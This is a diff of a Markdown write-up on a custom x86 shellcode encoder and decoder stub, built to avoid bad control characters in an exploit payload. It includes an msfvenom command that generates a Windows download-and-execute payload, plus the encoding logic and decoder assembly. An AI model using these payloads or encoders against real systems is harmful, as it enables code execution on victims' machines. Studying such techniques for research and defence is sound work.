@@ -85,27 +85,31 @@ Error: No valid set instruction could be created!
 ```
 
 > **Note** maybe there are commandline arguments in msfvenom which allow the payload to be encoded without any control char **AND** only avoiding the bad characters for [cat.exe](../cat) actually works fine in msfvenom.
-`root@kali:~# msfvenom --payload windows/download_exec --platform windows --arch x86 -b '\x00\x01\x02\x04\x05\x06\x07\x08\x0A\x0B\x0C\x0D' -f hex URL=http://localhost/ EXE=a.exe`
+```
+root@kali:~# msfvenom --payload windows/download_exec --platform windows --arch x86 -b '\x00\x01\x02\x04\x05\x06\x07\x08\x0A\x0B\x0C\x0D' -f hex URL=http://localhost/ EXE=a.exe
+```
 
 ---
 ## The encoder/decoder
 
-* The decoder stub is 52 or 56 bytes and
-* uses a table of 2 bytes per encoded character.
+* The decoder stub is 52 or 56 bytes and uses a table of 2 bytes per encoded character.
 * The maximum size of the encoded payload is ~~either maximum 12 bit or 4K long  excluded or~~ maximum 14 bit or 16K with the `0x7F (ESC)` character included. 
 
-> eg: 500 byte payload, with 40 control chars => `500 + (40 * 2) + 52 = 632` bytes after encoding
+> eg. 500 byte payload, with 40 control chars => `500 + (40 * 2) + 52 = 632` bytes after encoding
 
 > Because creating the payload failed this encoder/decoder was made. _(To avoid the characters `\x00\x01\x02\x04\x05\x06\x07\x08\x0A\x0B\x0C\x0D` the "x86/shikata_ga_nai" decoder adds merely `448 - 422 = 26` bytes. SO this decoder is not the best but does the job.. )_
 
 ### .. Creating an encoder
 
 * To avoid characters under value 32 those bytes are encoded in the payload with an or operation
-  `if c < 32: c = c |= 0x80`
 * The index of those encoded bytes are encoded and stored in word (2 byte) values in a table (an array).
-  	`high = (index & 0x3F80) >> 7`
-	`low = (index & 0x7F) << 8`
-	`index = high | low | 0x8080`
+  ```python
+  if value[index] < 32:
+    value[index] |= 0x80
+    high = (index & 0x3F80) >> 7
+    low = (index & 0x7F) << 8
+    index = high | low | 0x8080
+  ```
 * The new payload has the following format
 
 | ***`0x19E000`*** | 
@@ -117,7 +121,7 @@ Error: No valid set instruction could be created!
 | ***...*** | 
 | ***`0x1A0000`*** |
 
-> Note: The character `ESC 0x7F` isn't encoded in the current version. There's a version already in the test project.
+> Note: The character `ESC 0x7F` isn't encoded in the current version. To avoid this character the code needs to avoid `0x7F` which is possible by decrementing a zeroed byte register and shifting it to right by one. `(0x00 - 1) >> 1` Or by moving a lower value and adding one `0x7E + 1`.
 
 ### .. Creating a decoder
 
@@ -171,10 +175,10 @@ CALL 007 ; (popip)                   ; 02F | E8 D3FFFFFF
                                      ; 034
 ```
 
-### .. Breakdown of decoder
+### .. Breakdown of the decoder
 
 * The first that is executed is to get the address of current code or "instruction pointer" (getip). First a JMP is made to a CALL instruction near the index table. The CALL near the index table is convenient because CALL pushes the address after the instruction which is the address of the index table. So the address of the index table is popped into ESI.
-* The JMP instructions are done to safe distances (>= 32) to avoid control characters.
+* The JMP instructions are done to safe distances (>= 32) to avoid control characters, This is why the short version has NOP padding.
 ```asm
     JMP getip
     ; ...
@@ -187,10 +191,11 @@ getip:
     ; encoded payload
 ```
 * The negative size of the index table is moved into ECX.
-* The AND is optional (long version) when the negative size contains control chars. 
-* The table offset in ESI is moved to EDI, and the negative table size is subtracted from EDI. This is the same as adding the table size to EDI. Now EDI points to the encoded payload.
-* Now the table byte size in ECX is turned positive with NEG and converted into the table element length by shifting right with SHR.
-* EDX is set to zero with XOR.
+* The AND is optional (long version) to decode the size when it contains control chars. 
+* The table offset in ESI is moved to EDI, and the negative table size is subtracted from EDI. This is the same as adding the table size to EDI. 
+* ___(Now ESI points to the index table and EDI points to the encoded payload)___
+* The table byte size in ECX is turned positive with NEG and converted into the table element length by shifting right with SHR.
+* Next EDX is set to zero with XOR.
 ```asm
     ; ...
     MOV ECX, FFFFAABA
@@ -202,14 +207,14 @@ getip:
     XOR EDX, EDX
     ; ...
 ```
-* Now we're at the next label where the word index out the index table is moved into DX.
+* Now we're at the next label where the word index out of the index table is moved into DX.
 * The high bits, `0x8080` are removed with the AND.
-* The seven high bits are shifted one to right, because the two bytes contain seven bits.
-* If one bit was shifted out the carry flag is set, and JB jumps to carry
-* Where the OR sets the high bit of the low byte of the word index, then jumped back to the carried label.
+* The seven high bits in DH are shifted one to right, because the two bytes contain seven bits.
+* If one bit was shifted out the carry flag is set and JB jumps to carry.
+  * Where the OR sets the high bit (of the low byte) in DL, then JMP jumps back to the carried label.
 * After which the encoded byte is decoded with the AND operation.
-* Loop decrements ECX with one and jumps to the next label if ECX is not zero.
-* Now a JMP to the decoded payload, where EDI points to, is made.
+* Loop decrements ECX with one and jumps to the next label if ECX isn't zero.
+* Once ECX is zero a JMP to the decoded payload, where EDI points to, is made.
 ```asm
     ; ...
 carry:
@@ -230,7 +235,7 @@ carried:
 
 ### .. Port to ruby
 
-> To use the code in metasploit a port will be made later.
+> To use the code in metasploit a port should be made.
 
 ---
 ##  References
